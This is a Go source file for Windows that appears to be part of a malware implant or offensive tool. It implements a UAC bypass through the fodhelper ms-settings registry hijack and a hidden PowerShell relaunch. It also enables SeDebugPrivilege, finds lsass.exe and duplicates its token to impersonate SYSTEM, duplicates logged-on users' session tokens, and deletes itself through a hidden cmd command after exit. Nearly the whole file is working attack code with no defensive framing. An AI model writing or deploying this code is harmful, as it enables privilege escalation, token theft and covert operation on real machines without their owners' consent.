package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

var (
	advapi32                     = syscall.NewLazyDLL("advapi32.dll")
	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcessToken         = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx         = advapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser  = advapi32.NewProc("ImpersonateLoggedOnUser")
	procCreateProcessAsUserW     = advapi32.NewProc("CreateProcessAsUserW")
	procAdjustTokenPrivileges    = advapi32.NewProc("AdjustTokenPrivileges")
	procLookupPrivilegeValueW    = advapi32.NewProc("LookupPrivilegeValueW")
	procOpenProcess              = kernel32.NewProc("OpenProcess")
	procGetCurrentProcess        = kernel32.NewProc("GetCurrentProcess")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32.NewProc("Process32NextW")
	procOpenThread               = kernel32.NewProc("OpenThread")
	procSuspendThread            = kernel32.NewProc("SuspendThread")
	procResumeThread             = kernel32.NewProc("ResumeThread")
)

const (
	PROCESS_ALL_ACCESS        = 0x1F0FFF
	TOKEN_ALL_ACCESS          = 0xF01FF
	TOKEN_DUPLICATE           = 0x0002
	TOKEN_QUERY               = 0x0008
	TOKEN_IMPERSONATE         = 0x0004
	TOKEN_ASSIGN_PRIMARY      = 0x0001
	SecurityImpersonation     = 2
	TokenPrimary              = 1
	SE_PRIVILEGE_ENABLED      = 0x00000002
	TOKEN_ADJUST_PRIVILEGES   = 0x0020
	TH32CS_SNAPPROCESS        = 0x00000002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_READ           = 0x0010
)

type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

type LUID_AND_ATTRIBUTES struct {
	Luid       int64
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

func Elevate(mode int) error {
	log_(fmt.Sprintf("Elevate: mode=%d", mode))
	switch mode {
	case 1:
		return elevateCMSTPLUA()
	case 2:
		return elevateFodhelper()
	default:
		return elevateCMSTPLUA()
	}
}

func elevateCMSTPLUA() error {
	self, err := os.Executable()
	if err != nil {
		return err
	}
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		fmt.Sprintf("Start-Process -FilePath '%s' -Verb RunAs", self))
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	return cmd.Start()
}

func elevateFodhelper() error {
	self, err := os.Executable()
	if err != nil {
		return err
	}
	cmds := [][]string{
		{"reg", "add", `HKCU\Software\Classes\ms-settings\shell\open\command`, "/d", self, "/f"},
		{"reg", "add", `HKCU\Software\Classes\ms-settings\shell\open\command`, "/v", "DelegateExecute", "/d", "", "/f"},
		{"fodhelper.exe"},
	}
	for _, c := range cmds {
		cmd := exec.Command(c[0], c[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		cmd.Run()
	}
	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
	return nil
}

func findLsassProcess() (uint32, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == uintptr(syscall.InvalidHandle) {
		return 0, fmt.Errorf("Toolhelp32Snapshot: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var entry PROCESSENTRY32
	entry.dwSize = uint32(unsafe.Sizeof(entry))
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0, fmt.Errorf("Process32First failed")
	}
	target := "lsass.exe"
	for {
		name := syscall.UTF16ToString(entry.szExeFile[:])
		if equalCI(name, target) {
			return entry.th32ProcessID, nil
		}
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}
	return 0, fmt.Errorf("lsass.exe not found")
}

func getSystemToken() (syscall.Token, error) {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		log_(fmt.Sprintf("getSystemToken: SeDebug: %v", err))
	}
	pid, err := findLsassProcess()
	if err != nil {
		return 0, fmt.Errorf("getSystemToken: findLsass: %w", err)
	}
	hProc, _, err := procOpenProcess.Call(
		PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
		0,
		uintptr(pid),
	)
	if hProc == 0 {
		return 0, fmt.Errorf("getSystemToken: OpenProcess: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(hProc))

	var hToken syscall.Token
	ret, _, err := procOpenProcessToken.Call(
		hProc,
		TOKEN_DUPLICATE|TOKEN_QUERY,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("getSystemToken: OpenProcessToken: %v", err)
	}
	defer hToken.Close()

	var dupToken syscall.Token
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("getSystemToken: DuplicateTokenEx: %v", err)
	}
	return dupToken, nil
}

func impersonateSystem() error {
	tok, err := getSystemToken()
	if err != nil {
		return err
	}
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(tok))
	if ret == 0 {
		return fmt.Errorf("ImpersonateLoggedOnUser: %v", err)
	}
	log_("impersonateSystem: OK")
	return nil
}

func enablePrivilege(name string) error {
	namePtr, _ := syscall.UTF16PtrFromString(name)

	var luid int64
	ret, _, err := procLookupPrivilegeValueW.Call(
		0,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue(%s): %v", name, err)
	}

	var hToken syscall.Token
	selfProc, _, _ := procGetCurrentProcess.Call()
	procOpenProcessToken.Call(selfProc, TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	defer hToken.Close()
	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}
	procAdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0, 0, 0,
	)
	return nil
}

func Suicide(mode int) {
	log_(fmt.Sprintf("Suicide: mode=%d", mode))
	selfDelete()
	os.Exit(0)
}

func selfDelete() {
	self, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command("cmd", "/C",
		fmt.Sprintf("ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"", self))
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	_ = cmd.Start()
}

func DuplicateUserTokenFromSessionID(sessionID uint32) (syscall.Token, error) {
	wtsapi32 := syscall.NewLazyDLL("wtsapi32.dll")
	wtsQueryUserToken := wtsapi32.NewProc("WTSQueryUserToken")

	var hToken syscall.Token
	ret, _, err := wtsQueryUserToken.Call(
		uintptr(sessionID),
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("WTSQueryUserToken: %v", err)
	}

	var dupToken syscall.Token
	ret, _, err = procDuplicateTokenEx.Call(
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&dupToken)),
	)
	hToken.Close()
	if ret == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx: %v", err)
	}
	return dupToken, nil
}
